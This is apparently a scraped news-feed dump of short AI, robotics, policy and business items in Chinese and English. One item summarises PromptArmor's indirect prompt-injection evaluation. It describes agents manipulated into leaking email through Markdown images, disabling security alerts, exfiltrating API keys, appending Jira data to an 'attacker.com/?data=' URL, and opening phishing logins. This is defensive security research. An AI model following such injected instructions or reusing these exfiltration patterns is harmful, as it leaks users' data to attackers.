items.description: Tesla has filed a US patent application for a touch-sensitive “skin” that can be molded around robot fingers and palms, potentially providing humanoid robots with a scalable way of detecting contact, force and pressure. The application, US 2026/0310299 A1, was published on October 8 and describes a manufacturing process in which tactile sensors can be […]
items.excerpt:
Tesla has filed a US patent application for a touch-sensitive “skin” that can be molded around robot fingers and palms, potentially providing humanoid robots with a scalable way of detecting contact, force and pressure.
The application, US 2026/0310299 A1, was published on October 8 and describes a manufacturing process in which tactile sensors can be printed onto flat, flexible materials before being heat-formed into three-dimensional shapes.
The filing was brought to the attention of Robotics & Automation News by patent intelligence publication Patentlyze , which has published an analysis of the application.
Tesla’s proposed sensor uses two flexible substrate layers carrying conductive regions, separated by a compressible layer. Where conductive regions overlap, they form individual sensing points capable of detecting changes caused by pressure.
The patent describes both capacitive and piezoresistive approaches and lists thermoplastic polyurethane, PET and polyimide among the possible substrate materials.
One of the potentially significant aspects of the filing is its emphasis on manufacturability. Tesla describes processes including screen printing, laser cutting, conductive paste deposition and thermoforming – established manufacturing techniques that could potentially allow tactile surfaces to be produced at scale.
The application says: “The 3D tactile sensors can conform to curved geometries and can be used for measuring surface force, touch, and pressure.”
Although the filing does not specifically establish that the technology will be used in Tesla’s Optimus humanoid robot, it identifies robot fingertips, palms and end-effectors among potential applications.
Tactile sensing is becoming an increasingly important area of humanoid robotics as developers attempt to move beyond basic grasping towards more dexterous manipulation of objects with different shapes, weights and materials.
Patentlyze notes that the filing does not provide figures for the sensor’s sensitivity, resolution or durability, meaning its practical performance cannot yet be assessed.
The patent nevertheless provides another indication of Tesla’s work on the hardware required to give robots more sophisticated manipulation capabilities – not simply allowing a robotic hand to grasp an object, but potentially enabling it to feel how firmly it is holding it.

items.description: 商务部、科技部发布2026年第48号公告，就修订《中国禁止出口限制出口技术目录》公开征求意见，拟增列人工智能、生物医药、光伏共40项技术，其中禁止出口14项、限制出口26项，并对相关技术实施出口前登记的临时管理措施。 🔗 阅读原文 via AIHOT · https://aihot.news/items/p11tj593iq5nrtiotvoxllop4
items.excerpt:
商务部回应《中国禁止出口限制出口技术目录》拟增列人工智能等技术：确保安全可控，鼓励开源开放、合作共享
商务部、科技部发布2026年第48号公告，就修订《中国禁止出口限制出口技术目录》公开征求意见，拟增列人工智能、生物医药、光伏共40项技术，其中禁止出口14项、限制出口26项，并对相关技术实施出口前登记的临时管理措施。
商务部就目录修订答记者问，解释了哪些AI技术在列、哪些出海情形不受限，便于企业判断合规边界。
IT之家 10 月 16 日消息，今日，商务部、科技部发布 2026 年第 48 号公告，就修订《中国禁止出口限制出口技术目录》（以下简称《目录》）公开征求意见，并对相关技术实施出口前登记的临时管理措施。日前，商务部新闻发言人就有关问题回答了记者提问。IT之家整理商务部原文如下：
答：根据《中华人民共和国对外贸易法》第二十条，国务院对外贸易主管部门会同国务院其他有关部门，制定、调整并发布禁止或限制出口的技术目录。自 2001 年以来，商务部会同科技部多次调整修订《目录》，有进有出，有管有放，已形成工作惯例。此次修订亦是技术贸易管理的常态化工作，依法依规进行，不针对任何特定国家、地区或实体。
近年来，人工智能、生物医药和光伏相关技术在敏感领域的应用不断拓展，各主要经济体均实施了不同程度的出口管控。中国参考国际通行做法，依法实施必要的管理，既防范技术失控和不当扩散风险，也保障正常国际技术交流合作，推动科技向上向善、安全可控、造福人类。
答：此次公开征求意见涉及拟增列的人工智能、生物医药、光伏三个领域 40 项关键技术。其中，拟禁止出口技术 14 项，包括：人工智能驱动的恶意代码生成与变异技术、具有自主知识产权的细胞和基因治疗技术工艺平台、钙钛矿及叠层电池组件生产技术等；拟限制出口技术 26 项，包括：人工智能辅助漏洞挖掘技术、具有自主知识产权的通用型细胞和基因治疗全新靶点发现和验证技术、单线产能≥3 万吨 / 年的多晶硅工程技术等。公告还明确了适用便利措施等情形。详情请参考公告原文。
答：中国政府一贯支持企业依法依规开展互利共赢的跨国经营与国际技术合作，有关政策立场没有改变。针对此次公开征求意见的技术范围和政策，商务部、科技部会同行业主管部门，事前已广泛组织研究机构、行业组织开展深入评估，并充分听取主要企业的意见建议，充分考虑国内外产业现状和发展需求。具体表现在三个方面：一是列管范围精准有限。此次拟列管的多数技术已明确具体技术指标，且利用相关技术制造的产品不在管理范围内，管理范围清晰、精准、有限，为企业划定了合规边界，便于政策执行。二是适用便利措施。此次列管明确了拟适用便利措施的多种出口情形，体现了分级分类的管理理念，有助于增强政策的透明度和可预期性，确保技术出口安全、规范、有序。三是实施动态调整。商务部、科技部将依法对《目录》管理范围实施动态调整，根据技术发展情况，及时将不先进或落后技术移出《目录》。此次征求意见是在更大范围内听取各方意见建议的工作安排。
答：当前，全球人工智能技术创新进入前所未有的活跃期，机遇与挑战并存。此次拟将人工智能大模型、智能体、算力集群、信息处理相关 23 项关键技术增列至《目录》，主要有以下考虑：
一是确保人工智能技术安全可控。人工智能引发的各类内生和衍生风险已引起全球各国的高度关注。此次拟列管的人工智能自主驱动恶意代码生成与变异技术等，可被用于攻击国家关键信息基础设施、国防军工、核心政务等敏感系统，或用于绕过国家安全防御体系。若被非国家行为体或恶意实体获取，可能对国家安全和人类共同安全造成危害。中国政府对这类技术实施必要管理，目的是筑牢安全底线，防范滥用恶用，确保人工智能始终处于人类控制之下，推进人工智能国际治理。
二是鼓励开源开放、合作共享。中国政府致力于让人工智能成为促进共同繁荣、维护共同安全的一个重要动力源。为支持构建人工智能开源创新生态体系，对人工智能类技术开源、中国企业在境外自建自营算力中心、赴境外开展芯片流片制造、利用境外资源开展联合研发、参与国际标准制定等情形的技术出口，适用自动许可等便利措施，基本实现“即报即出”；对已通过开源、发表学术论文等方式进入公共领域的相关技术，拟不纳入出口管理范围，为人工智能技术国际交流合作创造良好环境。
需要特别指出的是，中方主张在相互尊重、平等互利基础上，与各国开展人工智能对话合作，共同应对人工智能技术扩散和失控风险。中方支持全球南方国家加强人工智能能力建设，弥合数智鸿沟，促进可持续发展。对于世界人工智能合作组织成员间开展能力建设国际合作、技术共享和规则共建所需的技术出口，将提供更多便利和支持。
答：当前，人工智能大模型和应用产品的“出海”模式多种多样，判别具体“出海”情形是否属于技术出口管理的范围，核心在于是否涉及限制类技术从中国境内向境外转移。
此次纳入监管的人工智能技术范围精准有限，有关措施正式实施后，绝大部分人工智能技术仍可以自由出口。对于纳入限制类的人工智能技术，开展海外本地化部署，属于技术出口管理范围；如果部署在海外自有云等风险相对可控的情形下，可适用自动许可等便利措施。对于企业利用限制类大模型对外提供 API 调用、APP / 网页交互、SaaS 应用、本地端侧轻量化部署等情形，不属于大模型技术出口管理范围。
答：现行《目录》中已有部分生物医药技术，此次拟增列病原微生物、细胞和基因治疗、小核酸药相关 5 项技术，主要有以下考虑：
一是维护人类生命健康安全。病原微生物技术等直接关系人类健康和国家生物安全，将其纳入《目录》实施禁止出口，是维护国家安全、构筑生物安全屏障的制度安排，也是保护全人类健康的客观需要。
二是支持我国生物医药技术依法依规有序开展国际合作。此次列管生物医药技术，对国际合作的重要情形作出排除或适用便利措施。例如，对具有自主知识产权的相关技术工艺平台，对外授权许可、利用相关技术工艺提供外包研发和生产服务等出口情形，不纳入管理范围；对于具有自主知识产权的相关靶点发现和验证技术，对外授权许可方式出口的，适用

items.description: Skild AI has demonstrated a new self-play training approach that enables robots to develop physical skills without relying on human demonstrations, using its S1 robotics foundation model to learn soccer through more than 140 years of simulated play. The company says the technique could eventually allow robots to acquire increasingly complex skills in factories, construction […]
items.excerpt:
Skild AI has demonstrated a new self-play training approach that enables robots to develop physical skills without relying on human demonstrations, using its S1 robotics foundation model to learn soccer through more than 140 years of simulated play.
The company says the technique could eventually allow robots to acquire increasingly complex skills in factories, construction sites, homes and other physical environments without people having to demonstrate every action.
Skild used Nvidia Isaac Sim to create the simulated environment, giving the model a single objective: score a goal.
Rather than specifying individual behaviors such as dribbling, tackling or recovering after a fall, the researchers allowed the policy to compete against progressively more capable versions of itself.
Skild says: “The policy then learned to score by playing against recent versions of itself. As it improved, its opponents improved alongside it – turning every gain in capability into an increasingly difficult opponent.”
During its first few simulated months, the robot could barely walk. As training continued, it learned to recover after falling and subsequently developed behaviors including dribbling around defenders, shielding the ball and tackling opponents.
According to Skild, those capabilities emerged from the objective of scoring rather than from individually engineered rewards for each behavior.
After more than 140 years of simulated play, Skild transferred the resulting policy from simulation to a physical humanoid robot and demonstrated it playing soccer.
The company says: “We see the successful transfer from simulation to humanoid, along with the sheer complexity of the task, as a bright green flag for self-play on the road to physical AGI.”
The work represents a post-training extension of S1, Skild’s robotics foundation model, which the company introduced in August.
S1 is pre-trained using data including human videos, glove data, simulation and teleoperation, and is designed to learn tasks from in-context demonstrations.
Skild argues, however, that training primarily from human-generated data ultimately constrains models to the capabilities represented in that data.
The company says: “However, because S1-class models are pre-trained on human data, they are capped at human capability. We believe physical self-play will enable robots to far exceed human capability.”

items.description: Scientists at ETH Zurich have demonstrated how an anthropomorphic robotic hand can use its fingers not only for manipulation but also for locomotion, enabling the hand to crawl, recover from falls and move around its environment without a separate mobility system. The research used an off-the-shelf robotic hand from WUJI, a developer of dexterous robotic […]
items.excerpt:
Scientists at ETH Zurich have demonstrated how an anthropomorphic robotic hand can use its fingers not only for manipulation but also for locomotion, enabling the hand to crawl, recover from falls and move around its environment without a separate mobility system.
The research used an off-the-shelf robotic hand from WUJI , a developer of dexterous robotic hands and teleoperation technology.
Rather than mounting the hand on a conventional robot arm or mobile platform, the researchers trained it to support its own weight and move using the same fingers normally intended for grasping and manipulation.
The resulting system was capable of untethered crawling, steering and recovering after falls. It could also perform manipulation tasks while supporting itself, including pressing successive keys on a keyboard and pushing an object toward specified targets.
The researchers describe the system as a “compact mobile manipulator” that eliminates the need for a separate locomotion mechanism.
The work was presented in a paper titled “Fingers as Legs: Learning Self-Supported Locomotion and Manipulation with an Anthropomorphic Hand”, by Amirhossein Kazemipour, Hehui Zheng and Robert Katzschmann.
The researchers used reinforcement learning to develop the locomotion capabilities, taking into account the unequal dimensions and characteristics of the individual fingers.
Training took place in simulation, with the simulated environment calibrated using measurements from the physical hardware.
According to the researchers, their reward formulation allowed the hand to move faster in simulation than when using tuned rewards originally developed for quadruped robots.
The physical system incorporated onboard power and computation, allowing it to operate as a self-contained platform.
For manipulation experiments, the hand performed successive keyboard commands without relying on vision. In another demonstration, it used overhead visual feedback to push an object toward target positions.
The research illustrates an unusual approach to mobile manipulation by allowing the same mechanisms to perform both locomotion and physical interaction.
It also highlights the increasing role of commercially available dexterous hands as research platforms for robot learning.

Pudu Robotics , best known for the delivery and cleaning robots increasingly found in restaurants, hotels and other commercial environments, is expanding its technology portfolio into semi-humanoid robots and quadrupeds as it looks beyond its established service robotics business.
The company demonstrated the direction of that expansion at IFA 2026 in Berlin in early September, where it exhibited a range of robots spanning commercial cleaning, industrial manipulation and four-legged mobility.
Among them was the D7, an industrial semi-humanoid robot that made its European debut at the event, alongside the D5-W quadruped robot and the CC1 Pro autonomous cleaning robot.
The diversification represents a significant broadening of Pudu’s product range. The company says it now has more than 130,000 robots operating in more than 85 countries, having built much of its business around commercial service robots such as its distinctive cat-faced BellaBot delivery robot.
Frost & Sullivan ranked Pudu as the world’s largest commercial service robot company by both revenue and shipments in 2025.
The D7 takes a somewhat different approach from the growing number of fully humanoid robots being developed for industrial applications.
Rather than using articulated legs to reproduce human walking, the semi-humanoid concentrates its 23 joints in its arms, waist and head. Pudu says the robot can lift loads weighing up to 20 kg.
The design reflects one of the emerging debates surrounding humanoid robotics: whether a human-like bipedal form is necessary for many industrial applications, or whether manufacturers can achieve greater reliability and lower complexity by combining humanoid manipulation capabilities with alternative forms of mobility.
Pudu also demonstrated the D5-W, a quadruped robot capable of carrying payloads of up to 30 kg and navigating stairs and uneven terrain.
The robot combines wheels and articulated legs, enabling it to switch between wheeled and legged locomotion depending on the environment. It can also recover autonomously after falling.
Pudu demonstrated the robot climbing stairs at IFA and staged an unusual demonstration in which the D7 semi-humanoid took the D5-W for a walk.
Alongside the newer robot forms, Pudu also showed how it is adding greater autonomy to the more established commercial robotics markets on which it built its business.
Its CC1 Pro autonomous cleaning robot incorporates a system that evaluates the results of its own cleaning operation

据彭博社 15 日报道，丹麦最高法院维持对一名 31 岁男子 18 个月监禁的判决，该男子因持有并传播 3.6 万余张 AI 生成的儿童色情图像获刑，且不适用缓刑。法院裁定，即使图像无真实人物原型，也受丹麦《刑法》约束，量刑时不应考虑人物是否虚构；此案为丹麦首起此类定罪，并引发跨国调查，警方查明 273 名买家身份、逮捕 25 人。
丹麦最高法院首次明确 AI 合成儿童色情图像即使无真人原型也受《刑法》约束，为同类案件的量刑原则提供了参考。
IT之家 10 月 16 日消息，据彭博社 15 日报道，丹麦最高法院维持对一名 31 岁男子判处的 18 个月监禁刑罚。该男子因 持有并传播数万张 AI 生成的儿童色情图像 而获刑。
这起备受关注的案件，涉及丹麦现行打击儿童性虐待影像的法律如何适用于 AI 合成内容。该国最高法院裁定， 即使 AI 生成的未成年人色情图像没有真实人物作为原型，也同样受到丹麦《刑法》约束 ，不能因为图像中的人物是虚构的就减轻刑罚。此前，两级下级法院对本案的量刑存在分歧。
判决指出，对于持有和传播描绘未满 18 岁者的色情材料，在量刑时不应考虑图像中的人物是否被认为是虚构的。
这是丹麦首起因制作和传播 AI 生成的儿童性虐待影像而定罪的案件，最高法院也借此首次明确了此类犯罪在丹麦法律下的量刑原则。
涉案男子曾利用 AI 制作超过 3.6 万张逼真的儿童色情图像，并通过网站和聊天频道传播。法庭文件显示，他还通过订阅服务出售部分图像，至少赚取 2.5 万丹麦克朗 （IT之家注：现汇率约合 24,801 元人民币） 。
警方 2023 年底突击搜查其住所时，男子 28 岁。他承认制作和传播图像的行为，但认为这些图像 并非以真人为原型 ，因此不应受到有关刑法条款的处罚。
去年，此案还引发了一场跨国警方行动，调查对象包括数百名购买这些图像的人。警方根据支付记录查明 273 人的身份，并在世界各地逮捕 25 人。
丹麦两级下级法院均认为，即使图像完全由 AI 合成，只要足够逼真，也可以依据现行打击儿童性虐待影像的法律追究刑事责任。但两级法院在具体量刑上存在明显分歧。
2025 年 1 月，地方法院 判处其 15 个月监禁 ，但允许大部分刑期缓期执行，理由之一是没有证据表明 AI 模型曾使用真实的儿童性虐待影像进行训练。同年晚些时候，高等法院改判 18 个月实刑，理由是 涉案图像数量庞大、传播活动有组织地开展，且部分图像被用于牟利 。
丹麦最高法院首次明确 AI 合成儿童色情图像即使无真人原型也受《刑法》约束，为同类案件的量刑原则提供了参考。

items.title: Supply Chain Pipeline Efficiency Fell 49% in Q2
items.description: Higher freight and fuel costs created budget pressure across shippers and carriers, slowing new buying decisions despite signs of market recovery.
items.excerpt:
The Logistics Growth Efficiency Ratio ("LGER"), which measures dollars of qualified pipeline created per dollar of total go-to-market spend, fell 49% according to the Supply Chain Growth Index.
The report, from LeadCoverage , finds that higher freight and fuel costs created budget pressure across shippers and carriers, slowing new buying decisions despite signs of market recovery.
LGER shows how many dollars of qualified pipeline companies generate for every dollar spent on go-to-market activity. This quarter, pipeline efficiency cooled across the market in Q2 even as freight indicators pointed to recovery. LeadCoverage's analysis traces the disconnect to shrinking capacity: prices rose, but buyer urgency did not.
"A rate spike is not a buying signal," said Kara Brown , CEO, in a statement. "Freight rates went up because trucks left the road, and that helps carriers on price. It does not give a shipper any new reason to switch providers, and a reason to switch is what fills a pipeline. This was clear in Q2, where price recovered, urgency did not, and pipeline efficiency dropped by half."
Key findings from the Q2 2026 Supply Chain Growth Index include:
Median LGER down 49% : Pipeline efficiency fell to $11.35 from $22.39 in Q1, though remaining well above Q4 2025 lows ($4.95).
Market-wide decline : Performance dropped across every band, with the 25th percentile down 27%, the 75th percentile down 46%, and the mean LGER down 52% to $48.35.
Steady concentration : The mean-to-median ratio held firm at 4.3x (vs. 4.5x in Q1), avoiding Q4's winner-take-all split.
3PLs dominate pipeline : Just three 3PL and broker programs targeting shippers drove ~68% of total pipeline ($117M of $173M). This suggests shipper-facing programs outperformed carrier-facing or broad-market campaigns in Q2.
Consistent spend, divergent yields : Most GTM budgets ranged from $100K–$370K per quarter, but pipeline outcomes varied up to 100x depending on deal size.
ABM and intent yield 2x LGER : Programs using ABM/intent tactics doubled the median LGER of non-users.
Higher rates helped carriers on price, but higher costs reduced buyer appetite across both shippers and carriers. Shippers paid an average contract rate of $3.11 per mile in August, up 29% year over year and the highest level since August 2022, according to DAT Freight & Analytics data reported by the Wall Street Journal .

路透社消息披露了 Anthropic 估值预期下调与营收增速放缓的具体数字，可帮助读者判断 AI 上市潮与基建投资情绪的走向。
IT之家 10 月 16 日消息，北京时间今天（16 日）凌晨，路透社援引四名知情人士消息称，随着 AI 融资成本持续攀升引发市场担忧，Anthropic 公布最新财务数据后，部分现有投资者和准备参与 IPO 的投资者 开始考虑下调对 Anthropic 的估值 。
其中三名知情人士称，部分投资者参加了 Anthropic 在旧金山举办的投资者日活动，并讨论了约 1.5 万亿美元 （IT之家注：现汇率约合 10.05 万亿元人民币） 的估值。此前，投资者预计 Anthropic 在 11 月上市时的估值 约为 2 万亿美元 （现汇率约合 13.41 万亿元人民币） 。
Anthropic 向潜在投资者披露，第三季度营收达到 168 亿美元 （现汇率约合 1,126.1 亿元人民币） ，环比增长 45%，并在调整部分财务项目后实现盈利。
业绩数据缓解了部分投资者对 AI 研发成本高昂的担忧的同时，营收增速放缓 仍令一些投资者失望。 Anthropic 第二季度营收达到 116 亿美元 （现汇率约合 777.55 亿元人民币） ，比第一季度增长一倍以上，第三季度的环比增幅则降至 45%。
Anthropic 上市后的市场反响也可能影响整个 AI 行业的前景。投资者认为，短期内 AI 市场的表现很大程度上取决于 Anthropic 能否顺利上市，以及随后 OpenAI 能否在明年上市。
投资者对 Anthropic 估值的顾虑，恰逢全球金融市场遭遇 科技股抛售潮 ，AI 基础设施企业、芯片制造商，以及向 AI 企业出租算力的新兴云服务商均受到冲击。获得英伟达投资的 CoreWeave 周四股价和债券价格大跌，反映出市场越来越担忧 AI 基础设施建设对债务融资的依赖。
如果 Anthropic 上市表现不佳，投资者对 AI 基础设施投资热潮的担忧可能进一步加深。
此前消息称，Anthropic 在 2025 年的营收增至前一年的约 12 倍，接近 46 亿美元 （现汇率约合 308.34 亿元人民币） ，但剔除主要由此前融资引起的负债减记影响后，经营亏损仍超过 80 亿美元 （现汇率约合 536.24 亿元人民币） 。
Anthropic 的招股说明书提出，AI 对全球经济的影响将超过工业化、电力和互联网带来的变革。Anthropic 同时披露，2025 年亏损 420 亿美元 （现汇率约合 2,815.25 亿元人民币） ，并预计未来建设 AI 基础设施还需要投入更多资金。

Beam is focused on coding and agentic use cases. It is for teams that want a frontier-scale model on their own hardware, infrastructure, or cloud, and want to customize it to their own use cases. Beam ships with its own dedicated open source Rust based harness that delivers the best performance from the model.

items.description: PromptArmor 在 9800 次试验的评测中发现，开放权重模型（DeepSeek、Kimi、GLM、Qwen）对真实世界间接提示词注入攻击链的易感率为 26.7%，闭源模型（GPT、Claude、Gemini）为 14.2%，开放权重模型易感率高 88%。 🔗 阅读原文 via AIHOT · https://aihot.news/items/y1c13l53cd5u3wg565qu60q4d
items.excerpt:
Open-weight models 88% more susceptible to cyber attacks
PromptArmor 在 9800 次试验的评测中发现，开放权重模型（DeepSeek、Kimi、GLM、Qwen）对真实世界间接提示词注入攻击链的易感率为 26.7%，闭源模型（GPT、Claude、Gemini）为 14.2%，开放权重模型易感率高 88%。
原文基于 9800 次试验给出开放权重与闭源模型在间接提示词注入下的易感率差距和分攻击数据，方法与结果可直接用于安全选型参考。
我们评估了开放权重模型和专有模型以测试其易感性；我们发现，开放权重模型对真实世界间接提示注入网络攻击链的易感性高出 88%。
在本次评估中，我们测试了企业环境中使用最多的提供商的最新旗舰模型和最新高性价比变体。
开放权重模型对间接提示注入网络攻击链的易感性高出 88%。以下是一些在开放权重模型与专有模型之间易感性存在显著差异的攻击示例。
通过 Markdown 图片外泄邮件 智能体在读取一封被注入的邮件后，通过 Markdown 图片泄露邮件内容。
我们的研究团队识别真实世界智能体系统（例如 Claude、ChatGPT、Atlassian Rovo 等）中的漏洞，并开发具有网络攻击影响（例如数据外泄或远程代码执行）的端到端间接提示注入攻击链。我们发表的研究已被多个行业框架和出版物引用（例如 OWASP Top 10 for LLMs 和 MITRE ATLAS 、OpenAI 关于 智能体中的数据外泄 和 智能体对抗鲁棒性 的研究）。
它们未覆盖当今智能体所面对的真实世界用例的复杂性和领域（例如法律、医疗、金融等），例如常驻智能体和长时程任务。
这一空白促使我们开发自己的评估基准，以更准确地衡量模型对真实世界智能体系统所面临的间接提示注入网络攻击的易感性。
真实的智能体系统很复杂；各系统在威胁模型和攻击面上各不相同，评估环境需要反映这一点。例如，你不能依赖模型拒绝来衡量攻击成功：在真实世界攻击中，模型并不理解它们正在采取的行动。这导致模型会错误表述自己是否中招（参见 Sonnet 5 谎称自己没有运行恶意软件 ），甚至会中招于它们已经识别出的攻击；示例如下：
“我刚刚仔细检查了 _norm.py 文件，发现了一些极其可疑、而且坦率地说可能带有恶意的行为。”
from src.analyze import analyze, FLAG_CATEGORIES
findings = analyze(text, FLAG_CATEGORIES) ← Analyze 函数运行了恶意的 _norm！
在智能体系统中，当智能体被不可信数据源操纵，使用其工具采取对用户产生网络攻击后果的行动（例如将敏感电子邮件转发给攻击者或运行未经授权的工作流）时，就发生了系统操纵。
例如，在 我们在 Elastic 的 Agentic Security Operations Center 中发现的一条攻击链 中，智能体的任务是分拣网络钓鱼电子邮件报告，但其中一条警报的内容操纵智能体执行攻击者的工作流。这些工作流会采取恶意行动，包括禁用警报路由规则、铸造并外泄 API 密钥，以及编辑租户中的数据。
在智能体系统中，当智能体被不可信数据源操纵，产生导致用户工作区数据被外泄给攻击者的输出时，就发生了数据外泄。
搜索： attacker.com/?data= ticket1-recovery-code...
我们的团队在 Atlassian Rovo 中发现了一条数据外泄型间接提示注入网络攻击链 。在这起攻击中，Rovo 被要求按照用户在网上找到的一份指南来整理 Jira 工单。该指南隐藏了一条指令，操纵该智能体将所有 Jira 工单附加到某个攻击者 URL 的末尾，并通过其网站检索工具请求它构建的这个 URL。随后，攻击者记录下他们收到的所有请求，包括附加在所请求 URL 上的受害者数据。
当不受信任的数据源操纵模型生成输出，从而对用户或正在处理智能体所创建内容的人员实施钓鱼攻击时，就构成了智能体系统中的钓鱼攻击。
一些示例包括：模型生成恶意链接、指示通过电话或电子邮件联系不受信任的第三方，甚至模型执行代码以创建虚假的登录界面。
我们的团队在 ChatGPT for Google Sheets 中发现了一条钓鱼攻击链 。在这起攻击中，一个导入的表格操纵 ChatGPT 运行由攻击者控制的脚本，从而弹出一个钓鱼登录窗口。
评估模型的易感性，不仅需要能够反映真实世界任务、工具和能力的逼真环境，还需要随着攻击者不断演进其手法，持续针对最新的攻击技术进行测试。
模型提供商通常会提供旗舰模型系列和高性价比系列。 OpenAI 和 Anthropic 在其旗舰模型之后发布了各自的高性价比模型，但这些较新的模型对间接提示注入网络攻击的易感性要高得多。 相比之下，对于 Qwen 和 DeepSeek，较新的高性价比模型比先于它们发布的旗舰模型对攻击的抵御能力更强。
我们还观察到，专有提供商的高性价比模型与旗舰模型之间的易感性差距，远大于开放权重提供商。
对于专有提供商，高性价比模型的易感性比旗舰模型高 169%；而对于开放权重提供商，高性价比模型的易感性比其旗舰模型低 5%。
旗舰模型： DeepSeek V4-Pro、Kimi K3、GLM-5.3、Qwen3.8-2.4T、Claude Fable 5.1、GPT-6 Astra、Gemini 3.1 Pro
高性价比模型： DeepSeek V4.1-Flash、Kimi K2.6、GLM-5.3-Flash、Qwen3.8-Flash-Next、Claude Haiku 5.5、GPT-6 Luna、Gemini 3.8 Flash

items.title: Google Research 展示 AI 智能体自主湿实验室的三项进展：VERID 框架、适配体闭环发现与全新蛋白结合剂设计
items.description: Google Research 发布三项研究，构建 AI 智能体自主湿实验室的基础模块。 🔗 阅读原文 via AIHOT · https://aihot.news/items/kovelcbltjj7xf054h8mffaxo
items.excerpt:
Grounding AI agents in biological reality: Building blocks for autonomous wet labs
Google Research 发布三项研究，构建 AI 智能体自主湿实验室的基础模块。
原文给出 VERID 数字孪生、闭环适配体与全新蛋白设计三项进展的实验数据，可了解 AI 智能体走进湿实验室的真实差距与解法。
前沿 AI 系统有潜力通过智能地探索庞大的组合搜索空间（例如，一个仅含 100 个氨基酸的蛋白质就至少对应 20 100 种可能的序列）来变革生物学研究和药物发现，这要求进行动态的多候选探索。我们的长期研究愿景是，AI 智能体不仅能提出构想和分析，还能运行实验室实验来检验其假设、从结果中学习并自我改进以解决复杂问题——这一切都由人类的科学能动性驱动。
实现这一愿景需要解决两个相互交织的挑战：第一，前沿模型仍无法可靠地对三维几何和物理状态进行推理——这给专用液体处理机器人的自动化带来了问题，这些机器人负责在湿实验室中移动试剂、追踪体积并执行分子生物学方案。第二，尽管智能体的假设生成和 in-silico 设计正在迅速发展，需要反复进行真实世界反馈循环来验证提案并探索庞大的搜索空间，但真实世界的湿实验室实验却未能跟上步伐，使得实验读数比以往任何时候都更像是瓶颈。
在这篇文章中，我们分享三个研究项目，重点介绍我们在弥合 in-silico AI 探索与真实世界湿实验室实验之间差距方面取得的进展：
首先，我们提出 VERified Infrastructure for Discovery Laboratories （VERID）框架，以弥合 AI 智能体的高层推理与湿实验室复杂且易出错的物理现实之间的差距。它是实验室工作单元的语义数字孪生，即一个实时、有状态的 3D 体积实体树，追踪从机械臂几何结构到单个孔板体积、试剂身份和移液器吸头库存的一切。
一条命令的安全性取决于实时物理上下文以及代码本身。智能体可能生成语法上有效但在物理上不可能（例如，将 8 通道移液器降入过短的窄槽中）、在物流上无效（例如，从已耗尽的孔中吸取），或因未建模的流体效应而在科学上存在缺陷的代码。
VERID 构建在开源 PyLabRobot framework 之上，提供四项核心能力：
在 我们的报告 中，我们通过案例研究展示了这些能力的实际应用。首先，同步的视频和执行轨迹捕捉到了因分液过于靠近孔板底部而导致的不均匀染料分层，使智能体得以改进其混合策略。在同一轮实验中，持续存在的 数字孪生 状态使智能体能够在运行中途从读板机故障中恢复，而无需重新移液。其次，当模拟器拒绝了一个在物理上无法放入狭窄槽中的8通道吸液操作时，智能体即时重新规划，并设计了一项有针对性的析因诊断，分离出由吸头壁残留携带造成的细微偏差，而仅靠重复实验本会遗漏这一问题。最后，在一项闭环自我对弈实验中，一个智能体迭代地设计和运行机器人实验，从俯视相机图像中重建盲法染料混合物，并在多次运行中识别出自身的光学和流体伪影，将准确率提高了五倍以上。
可复现的执行和完整轨迹日志——记录停留时间、蒸发和孔板布局等过程变量——为智能体奠定了基础，使其最终能够在多轮中并行探索和优化众多候选方案时，将生物信号与实验噪声区分开来。
智能体需要真实的实验读数来改进其假设，因为计算模型无法捕捉湿实验室反应中发生的全貌，也无法取代实证验证。在“ 适配体作为实验室在环智能体分子发现的沙盒 ”中，我们使用结合蛋白质的DNA 适配体 ，在3个设计-测试-迭代周期内与AI智能体一起对闭环实验室进行原型验证。适配体发现是临床生物标志物发现研究中常见的一类实验。一个完整的适配体设计-测试-分析周期仅需7–10天，因为DNA可以在混合文库中化学合成，并通过测序直接读出。在每一轮中，智能体设计候选序列，这些序列在磁珠上针对目标蛋白质进行筛选以分离功能性结合物，然后进行测序，为下一周期返回丰富的定量数据。
在两个难度不同的蛋白质靶标（ 肌红蛋白 和 α-凝血酶 ）上进行的三个轮次中，AI驱动的理性设计和从头设计提高了经确认的靶向命中率，如下图所示（肌红蛋白和α-凝血酶分别达到33.5%和42.1%），不过每个靶标都需要识别并克服一种不同的湿实验室失败模式。
在α-凝血酶上，第1轮产生了0%的结合物，因为固定的引物突出端破坏了48%序列的折叠；一旦智能体在第2轮引入夹持的侧翼茎结构并在第3轮进行多样化，命中率便攀升至26.0%，随后在98.5%的特异性下达到42.1%。
在肌红蛋白上，由于智能体在第2轮中优先考虑原始结合亲和力，它们大量富集了 G-四链体 基序（占设计的63%）。虽然原始 pull-down 信号增加了，但湿实验数据显示，这些G-四链体大多是非特异性的"粘性"结合物，会附着在脱靶蛋白和裸磁珠上，导致靶标特异性（从75.0%降至19.1%）和真实的、经磁珠校正的命中率（从10.2%降至3.7%）双双骤降。智能体从第2轮读数中识别出这一假象后，自主修订了第3轮的设计规则，限制混杂基序、扣除磁珠结合物，并转向非G4结构支架，从而恢复了特异性（72.4%），并使在靶命中率激增九倍（33.5%）。
在论文中，我们还考察了智能体如何像科学家一样推理，分析数据并提出对湿实验方案的调整建议，但有时也会以非典型方式思考，探索结构生物学家可能不会涉足的序列空间。
蛋白质的闭环更为复杂。与化学合成的适配体不同，蛋白质必须通过生物方式表达，因此每个循环都会增加细胞或无细胞选择、表达和折叠步骤。再加上更大的序列空间，这在计算和湿实验两侧都造成了瓶颈。
在" 智能体引导的表位切除实现经济的从头结合物设计 "中，我们将工作流程应用于 成纤维细胞活化蛋白α（FAP） ，这是一种在实体瘤中过表达的大型、具有挑战性的受体。仅经过少数几轮实验，最佳设计就产生了具有个位数纳摩尔亲和力的结合物，这种紧密的、类药物结合水平通常只有经过大量实验室优化轮次才能达到。

items.description: AMD 与 Embedded LLM 在 vLLM 官方博客详解 Kimi K3 在八卡 AMD Instinct MI355X 上的推理优化。 🔗 阅读原文 via AIHOT · https://aihot.news/items/jc7pyt619xhznn9j28apoedto
items.excerpt:
Scaling Kimi K3 on AMD Instinct MI355X: Matching NVIDIA HGX B300 Throughput per GPU on AgentX
AMD 与 Embedded LLM 在 vLLM 官方博客详解 Kimi K3 在八卡 AMD Instinct MI355X 上的推理优化。
原文拆解了 50 多个 PR 背后的缓存、MoE、内核融合与投机解码优化思路，读者可迁移到自己的推理栈排查瓶颈。
